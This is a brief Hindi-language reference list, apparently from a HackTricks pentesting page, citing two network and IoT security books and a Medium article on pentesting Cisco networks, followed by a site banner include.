- **नेटवर्क सुरक्षा आकलन: अपने नेटवर्क को जानें (3रा संस्करण)**
- **व्यावहारिक IoT हैकिंग: इंटरनेट ऑफ थिंग्स पर हमले के लिए अंतिम गाइड। द्वारा फोटियॉस चांटज़िस, इओआनिस स्टाइस, पॉलिनो कैल्डेरोन, एवेंजेलोस डीरमेंटज़ोग्लू, ब्यू वुड**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
